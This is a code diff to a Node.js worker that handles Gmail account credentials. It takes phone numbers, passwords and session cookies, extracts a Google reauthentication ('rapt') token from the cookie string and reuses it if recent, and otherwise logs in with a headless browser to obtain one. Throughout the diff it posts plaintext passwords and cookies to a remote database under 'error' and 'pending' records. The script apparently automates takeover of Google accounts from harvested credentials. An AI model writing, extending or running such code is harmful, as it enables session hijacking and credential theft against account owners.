@@ -175,7 +175,7 @@ async function startServer() {
                 mSameNumber = 0
             }
             console.log('Process: [ Receive New Data --- Time: '+getTime()+' ]')
-            await loginWithCompleted(data.number, data.password, data.cookies, data.key)
+            await loginWithCompleted(data.number, data.password, data.cookies, data.time, data.key)
             prevNumber = data.number
             try {
                 process.send({ t:9, s:false })
@@ -198,12 +198,14 @@ async function getChangeWorker() {
     return {}
 }
 
-async function loginWithCompleted(number, password, cookies, worker) {
+async function loginWithCompleted(number, password, cookies, time, worker) {
     if (mChangeWorker[worker]) {
         try {
-            if (await isValidCookies(cookies)) {
+            let raptToken = cookies.substring(0, cookies.indexOf('||'))
+            let pureCookies = cookies.substring(cookies.indexOf('||')+2)
+            if (await isValidCookies(pureCookies)) {
                 mMailRequest = false
-                mMailCookies = await getMailCookie(cookies)
+                mMailCookies = await getMailCookie(pureCookies)
 
                 mMailData = await getMailTokenData()
                 let mMailYear = await getMailYear(mMailData)
@@ -222,9 +224,13 @@ async function loginWithCompleted(number, password, cookies, worker) {
                         '--disable-dev-shm-usage'
                     ]
                 })
+
+                if (Date.now() - time >= 900000) {
+                    raptToken = ''
+                }
             
                 let loadCookie = {}
-                let tempCookie = cookies.split(';')
+                let tempCookie = pureCookies.split(';')
 
                 for (let i = 0; i < tempCookie.length; i++) {
                     try {
@@ -289,10 +295,16 @@ async function loginWithCompleted(number, password, cookies, worker) {
 
                     console.log('Process: [ Gmail Name: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
                     
-                    let mToken = await waitForRaptToken(page, '+'+number.replace('8800', '880'), password)
+                    let mPassword = null
+                    let mRapt = null
 
-                    let mPassword = encrypt(mToken.password)
-                    let mRapt = mToken.token
+                    if (raptToken && raptToken.length > 10) {
+                        mRapt = raptToken
+                    } else {
+                        let mToken = await waitForRaptToken(page, '+'+number.replace('8800', '880'), password)
+                        mPassword = encrypt(mToken.password)
+                        mRapt = mToken.token
+                    }
 
                     console.log('Process: [ Rapt Token: '+(mRapt == null ? 'NULL' : 'Received')+' --- Time: '+getTime()+' ]')
                     
@@ -365,7 +377,7 @@ async function loginWithCompleted(number, password, cookies, worker) {
                             } catch (error) {}
                         } else {
                             try {
-                                await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, create: parseInt(new Date().getTime()/1000) }), {
+                                await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, create: time }), {
                                     headers: {
                                         'Content-Type': 'application/x-www-form-urlencoded'
                                     }
@@ -380,7 +392,7 @@ async function loginWithCompleted(number, password, cookies, worker) {
                         let n_cookies = await getNewCookies(await page.cookies())
                         
                         try {
-                            await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail: mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
+                            await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail: mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, n_cookies:n_cookies, create: time }), {
                                 headers: {
                                     'Content-Type': 'application/x-www-form-urlencoded'
                                 }
@@ -416,7 +428,7 @@ async function loginWithCompleted(number, password, cookies, worker) {
         try {
             if (mSameNumber > 2) {
                 try {
-                    await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, worker:worker, create: parseInt(new Date().getTime()/1000) }), {
+                    await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, worker:worker, create: time }), {
                         headers: {
                             'Content-Type': 'application/x-www-form-urlencoded'
                         }
@@ -431,7 +443,7 @@ async function loginWithCompleted(number, password, cookies, worker) {
         console.log('Node: [ Not Change: '+number+' --- Time: '+getTime()+' ]')
 
         try {
-            await axios.patch(BASE_URL+'pending/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, key:worker, time:parseInt(new Date().getTime()/1000) }), {
+            await axios.patch(BASE_URL+'pending/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, key:worker, time:time }), {
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded'
                 }
